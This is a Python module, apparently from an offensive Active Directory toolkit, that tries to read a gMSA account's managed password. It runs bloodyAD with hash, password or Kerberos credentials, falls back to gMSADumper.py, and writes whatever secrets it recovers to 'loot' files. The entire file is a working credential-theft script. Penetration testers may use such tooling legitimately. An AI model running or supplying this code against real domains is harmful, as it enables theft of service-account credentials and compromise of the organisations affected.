# modules/readgmsa.py

import shutil
import re
from core.helpers import get_bloodyad_auth, save_loot, run_command
from core.colors import red, green, yellow, blue

def attack_read_gmsa(session, gmsa_account):
    print(blue(f"[*] Trying to read gMSA password for '{gmsa_account}' using BloodyAD..."))

    # === Auth Method Detection ===
    if session.hash:
        auth = f"-u {session.username} -p :{session.hash}"
        bloody_cmd = (
            f"bloodyAD --host {session.target_ip} -d {session.domain} "
            f"{auth} get object \"{gmsa_account}\" --attr msDS-ManagedPassword"
        )
    elif session.password:
        auth = f"-u {session.username} -p \"{session.password}\""
        bloody_cmd = (
            f"bloodyAD --host {session.target_ip} -d {session.domain} "
            f"{auth} get object \"{gmsa_account}\" --attr msDS-ManagedPassword"
        )
    else:
        # Kerberos mode
        if not session.dc_hostname:
            print(red("[-] Kerberos mode requires session.dc_hostname (FQDN of domain controller)."))
            return
        bloody_cmd = (
            f"bloodyAD --kerberos --host {session.dc_hostname} --dc-ip {session.dc_ip} "
            f"-d {session.domain} get object \"{gmsa_account}\" --attr msDS-ManagedPassword"
        )

    out, err = run_command(bloody_cmd)
    combined = out + "\n" + err

    # === Success Case: Secret Present ===
    if "msDS-ManagedPassword" in combined or "NTLM" in combined:
        print(green(f"[+] BloodyAD output:\n{out.strip()}"))
        save_loot("gmsa_secrets.txt", out or err)
        return

    # === Partial Success ===
    if "distinguishedName" in combined and "msDS-ManagedPassword" not in combined:
        print(yellow("[!] Object found, but msDS-ManagedPassword attribute is not readable."))
        save_loot("gmsa_partial.txt", combined)
        return

    # === BloodyAD Failure ===
    print(red(f"[!] BloodyAD failed: {err if err else out}"))

    if "access denied" in combined.lower():
        print(yellow("[!] Access denied. Trying fallback..."))
    elif "not found" in combined.lower():
        print(red("[-] gMSA object not found. Check spelling or existence."))
        return
    else:
        print(yellow("[*] Trying fallback with gMSADumper..."))

    # === Fallback: gMSADumper.py ===
    if not shutil.which("gMSADumper.py"):
        print(red("[-] gMSADumper.py not found in PATH. Please install Impacket or symlink it."))
        return

    # === Build Fallback Command
    if session.hash:
        fallback_cmd = (
            f"python3 gMSADumper.py {session.domain}/{session.username} "
            f"-hashes :{session.hash} -dc-ip {session.target_ip}"
        )
    elif session.password:
        fallback_cmd = (
            f"python3 gMSADumper.py {session.domain}/{session.username}:{session.password} "
            f"@{session.target_ip}"
        )
    else:
        print(yellow("[!] Kerberos-only auth detected. Skipping fallback to gMSADumper (not supported)."))
        return

    out, err = run_command(fallback_cmd)
    combined = out + "\n" + err

    # === Fallback Success ===
    if gmsa_account.lower() in combined.lower() and "ManagedPassword" in combined:
        print(green(f"[+] gMSADumper succeeded:\n{out.strip()}"))
        save_loot("gmsa_secrets.txt", out)
    else:
        print(red(f"[-] gMSADumper failed or returned no secrets for {gmsa_account}."))
        if err:
            print(yellow(f"[!] Error: {err.strip()}"))
